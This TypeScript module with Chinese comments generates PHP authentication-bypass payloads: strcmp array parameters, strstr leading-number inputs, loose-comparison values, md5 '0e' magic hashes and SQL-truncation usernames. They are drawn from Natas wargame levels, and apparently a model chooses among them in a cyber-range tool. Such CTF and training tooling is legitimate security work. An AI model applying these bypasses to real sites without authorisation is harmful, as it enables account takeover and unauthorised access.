/**
 * PHP 弱类型/特殊绕过原语（cyber-range 经验固化）
 *
 * 经验来源（Natas 实战）：
 *  - natas23：`strstr($x,'iloveyou') && $x>10` → `11iloveyou`（strstr 命中 + 前导数字 11>10）
 *  - natas24：`!strcmp($x,密码)` → `?passwd[]=x`（PHP 数组参数使 strcmp 返回 NULL，`!NULL`=true）
 *  - natas27：SQL truncation——varchar(64) 无 UNIQUE，注册 65 字符超长用户名被截断存储，登录用带空格用户名精确匹配
 *  - 通用教训：PHP 弱比较 `==`（true 万能）vs 强比较 `===`（不可绕过）
 *
 * 设计：生成「弱类型绕过候选 + 原理说明」，模型判断目标代码形态后选用。
 */

export type JugglingKind =
  | 'strcmp_array'   // !strcmp($a,$b) → 传数组
  | 'strstr_numeric' // strstr 命中 && 数字比较 → 前导数字+子串
  | 'loose_compare'  // == 弱比较 → 数字 vs 字符串
  | 'md5_loose'      // md5()==md5() 弱比较 → 0e 碰撞
  | 'type_magic'     // 0 == "string" → true（PHP8 前）

export interface JugglingCandidate {
  kind: JugglingKind
  /** 构造的输入值 */
  value: string
  /** 触发条件/代码形态 */
  target: string
  /** 原理说明 */
  note: string
}

/** strstr + 数字比较：值必须包含 needle 且前导数字 > n */
export function strstrNumeric(needle: string, gt: number): JugglingCandidate {
  return {
    kind: 'strstr_numeric',
    value: `${gt + 1}${needle}`,
    target: `strstr($input,'${needle}') && $input>${gt}`,
    note: `前导数字 ${gt + 1} 使数字比较通过（>${gt}），尾部含 needle 使 strstr 命中；PHP 比较数字字符串时取前导数字`,
  }
}

/** strcmp 数组绕过：!strcmp($input, $secret) */
export function strcmpArray(): JugglingCandidate {
  return {
    kind: 'strcmp_array',
    value: 'param[]=x',
    target: '!strcmp($input, $secret)',
    note: 'PHP5/7 对数组参数 strcmp() 返回 NULL，!NULL=true；需以数组形式提交（?passwd[]=x），页面 Warning 但照常输出',
  }
}

/** 弱比较 ==：数字 vs 字符串（PHP8 前 0=="string" 为 true；PHP8 后仅数字字符串比较） */
export function looseCompare(hint: string): JugglingCandidate[] {
  const out: JugglingCandidate[] = []
  out.push({
    kind: 'loose_compare',
    value: '0',
    target: '$input == "somestring"',
    note: 'PHP7 及更早：0=="非数字字符串" 为 true（数字转字符串比较）；PHP8 起改为纯数字字符串比较，此招失效',
  })
  out.push({
    kind: 'loose_compare',
    value: hint || '0e0',
    target: '$input == 0 / == false',
    note: `传 ${hint || '0e0'}：与 0/false 弱比较成立；'0e' 开头的字符串被当作科学计数法 0（见 md5_loose）`,
  })
  return out
}

/** md5 弱比较 0e 碰撞：md5($input) == 0 形式 */
export function md5Loose(known: string[]): JugglingCandidate {
  return {
    kind: 'md5_loose',
    value: known[0] ?? '240610708',
    target: 'md5($input) == 0（或 md5($a)==md5($b) 弱比较）',
    note: `md5 值形如 0e\d+ 的字符串（0e 开头）在弱比较下等于 0；已知碰撞：${known.join(' / ') || '240610708 / QNKCDZO / s878926199a'}。弱比较可绕过；强比较 === 需真碰撞`,
  }
}

/** SQL truncation（natas27）：注册超长用户名被截断 */
export function sqlTruncation(username: string, maxLen: number, password: string): JugglingCandidate {
  // 填充数下限钳到 0：原式 `maxLen - username.length + 1` 在 username 比字段长 2 字节以上时为负，
  // `' '.repeat(负)` 抛 RangeError（实测 `username='a'.repeat(70), maxLen=64` → Invalid count value: -5）
  // ——而「用户名比字段长」正是 natas27 的主场景。钳零后契约不变：crafted 恒长于 maxLen（仍会被截断）。
  const padCount = Math.max(0, maxLen - username.length + 1)
  const pad = ' '.repeat(padCount)
  const crafted = username + pad + 'x'
  return {
    kind: 'type_magic',
    value: `username=${crafted} / password=${password}`,
    target: `INSERT 无 UNIQUE 校验 + substr(0,${maxLen}) 截断`,
    note: `注册 ${crafted.length} 字符用户名（>${maxLen}）被截断为 "${username}${pad}"；登录时用 ${crafted}（NO PAD 下精确匹配截断行），服务器 trim 后归一到 ${username} 泄露目标数据`,
  }
}

/** 生成一组弱类型绕过候选 */
export function generateJuggling(opts: {
  kind?: JugglingKind
  needle?: string
  gt?: number
  username?: string
  maxLen?: number
  password?: string
  md5Known?: string[]
}): JugglingCandidate[] {
  const kind = opts.kind
  const out: JugglingCandidate[] = []
  if (!kind || kind === 'strstr_numeric') {
    if (opts.needle) out.push(strstrNumeric(opts.needle, opts.gt ?? 10))
  }
  if (!kind || kind === 'strcmp_array') out.push(strcmpArray())
  if (!kind || kind === 'loose_compare') out.push(...looseCompare(''))
  if (!kind || kind === 'md5_loose') out.push(md5Loose(opts.md5Known ?? []))
  if (!kind || kind === 'type_magic') {
    if (opts.username && opts.maxLen) out.push(sqlTruncation(opts.username, opts.maxLen, opts.password ?? 'x'))
  }
  return out
}
